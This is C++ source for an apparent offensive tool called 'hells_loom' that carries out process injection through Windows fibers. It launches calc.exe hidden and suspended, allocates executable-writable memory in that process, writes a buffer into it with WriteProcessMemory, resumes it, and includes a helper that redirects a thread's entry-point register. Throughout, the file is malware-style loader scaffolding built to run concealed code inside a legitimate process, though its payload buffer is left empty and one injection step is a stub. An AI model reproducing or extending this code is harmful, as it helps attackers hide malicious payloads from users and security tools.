#include "hells_loom.h"
#include <iostream>

static FIBER_CONTEXT* g_ctx = nullptr;

ProcessManager::ProcessManager(const std::wstring& target) : targetPath(target) {
    ZeroMemory(&ctx, sizeof(FIBER_CONTEXT));
    ctx.initialized = FALSE;
    ctx.switchCount = 0;
}

ProcessManager::~ProcessManager() {
    Cleanup();
}

BOOL ProcessManager::SetupMainFiber() {
    ctx.mainFiber = ConvertThreadToFiber(nullptr);
    if (!ctx.mainFiber) {
        ctx.mainFiber = GetCurrentFiber();
        if (ctx.mainFiber == nullptr || ctx.mainFiber == (LPVOID)0x1E00) {
            return FALSE;
        }
    }
    
    ctx.buffer = (BYTE*)VirtualAlloc(
        nullptr, 
        PAYLOAD_SIZE, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    
    if (!ctx.buffer) {
        return FALSE;
    }
    
    ctx.initialized = TRUE;
    return TRUE;
}

VOID CALLBACK ProcessManager::WorkerProc(LPVOID lpParameter) {
    FIBER_CONTEXT* fctx = (FIBER_CONTEXT*)lpParameter;
    
    if (!fctx || !fctx->initialized) {
        if (fctx && fctx->mainFiber) {
            SwitchToFiber(fctx->mainFiber);
        }
        return;
    }
    
    fctx->switchCount++;
    
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = { 0 };
    
    wchar_t cmdLine[] = L"C:\\Windows\\System32\\calc.exe";
    
    BOOL result = CreateProcessW(
        nullptr,
        cmdLine,
        nullptr,
        nullptr,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    );
    
    if (result) {
        fctx->hProcess = pi.hProcess;
        fctx->hThread = pi.hThread;
        fctx->pid = pi.dwProcessId;
        
        fctx->threadContext.ContextFlags = CONTEXT_FULL;
        if (GetThreadContext(pi.hThread, &fctx->threadContext)) {
            
            if (fctx->helperFiber) {
                SwitchToFiber(fctx->helperFiber);
            } else {
                ResumeThread(pi.hThread);
                SwitchToFiber(fctx->mainFiber);
            }
        } else {
            ResumeThread(pi.hThread);
            SwitchToFiber(fctx->mainFiber);
        }
    } else {
        SwitchToFiber(fctx->mainFiber);
    }
}

VOID CALLBACK ProcessManager::HelperProc(LPVOID lpParameter) {
    FIBER_CONTEXT* fctx = (FIBER_CONTEXT*)lpParameter;
    
    if (!fctx || !fctx->initialized) {
        if (fctx && fctx->mainFiber) {
            SwitchToFiber(fctx->mainFiber);
        }
        return;
    }
    
    fctx->switchCount++;
    
    if (fctx->hThread && fctx->hProcess) {
        
        SIZE_T written = 0;
        LPVOID remoteBuffer = VirtualAllocEx(
            fctx->hProcess,
            nullptr,
            fctx->bufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        if (remoteBuffer && fctx->buffer && fctx->bufferSize > 0) {
            WriteProcessMemory(
                fctx->hProcess,
                remoteBuffer,
                fctx->buffer,
                fctx->bufferSize,
                &written
            );
            fctx->remoteAddr = remoteBuffer;
        }
        
        ResumeThread(fctx->hThread);
    }
    
    SwitchToFiber(fctx->mainFiber);
}

BOOL ProcessManager::CreateWorkerFiber() {
    if (!ctx.initialized) {
        return FALSE;
    }
    
    g_ctx = &ctx;
    
    ctx.workerFiber = CreateFiber(
        FIBER_STACK_SIZE, 
        WorkerProc, 
        &ctx
    );
    
    if (!ctx.workerFiber) {
        return FALSE;
    }
    
    return TRUE;
}

BOOL ProcessManager::CreateHelperFiber() {
    if (!ctx.initialized || !ctx.workerFiber) {
        return FALSE;
    }
    
    ctx.helperFiber = CreateFiber(
        FIBER_STACK_SIZE,
        HelperProc,
        &ctx
    );
    
    if (!ctx.helperFiber) {
        return FALSE;
    }
    
    return TRUE;
}

BOOL ProcessManager::SwitchToWorker() {
    if (!ctx.workerFiber) {
        return FALSE;
    }
    
    SwitchToFiber(ctx.workerFiber);
    
    return TRUE;
}

BOOL ProcessManager::InjectPayload() {
    if (!ctx.hProcess || !ctx.buffer) {
        return FALSE;
    }
    
    return TRUE;
}

BOOL ProcessManager::Cleanup() {
    if (ctx.buffer) {
        VirtualFree(ctx.buffer, 0, MEM_RELEASE);
        ctx.buffer = nullptr;
    }
    
    if (ctx.workerFiber) {
        DeleteFiber(ctx.workerFiber);
        ctx.workerFiber = nullptr;
    }
    
    if (ctx.helperFiber) {
        DeleteFiber(ctx.helperFiber);
        ctx.helperFiber = nullptr;
    }
    
    if (ctx.hThread) {
        CloseHandle(ctx.hThread);
        ctx.hThread = nullptr;
    }
    
    if (ctx.hProcess) {
        CloseHandle(ctx.hProcess);
        ctx.hProcess = nullptr;
    }
    
    return TRUE;
}

BOOL ProcessManager::Run() {
    if (!SetupMainFiber()) {
        std::wcerr << L"[!] Main fiber setup failed" << std::endl;
        return FALSE;
    }
    
    if (!CreateWorkerFiber()) {
        std::wcerr << L"[!] Worker fiber creation failed" << std::endl;
        return FALSE;
    }
    
    if (!CreateHelperFiber()) {
        std::wcerr << L"[!] Helper fiber creation failed" << std::endl;
        return FALSE;
    }
    
    if (!SwitchToWorker()) {
        std::wcerr << L"[!] Fiber switch failed" << std::endl;
        return FALSE;
    }
    
    return TRUE;
}

BOOL CreateTargetProcess(const std::wstring& path, PROCESS_INFORMATION* pi) {
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    std::wstring cmdLine = path;
    
    return CreateProcessW(
        nullptr,
        &cmdLine[0],
        nullptr,
        nullptr,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        pi
    );
}

BOOL ModifyThreadContext(HANDLE hThread, LPVOID entryPoint) {
    if (!hThread || !entryPoint) {
        return FALSE;
    }
    
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        return FALSE;
    }
    
#ifdef _WIN64
    ctx.Rcx = (DWORD64)entryPoint;
#else
    ctx.Eax = (DWORD)entryPoint;
#endif
    
    return SetThreadContext(hThread, &ctx);
}
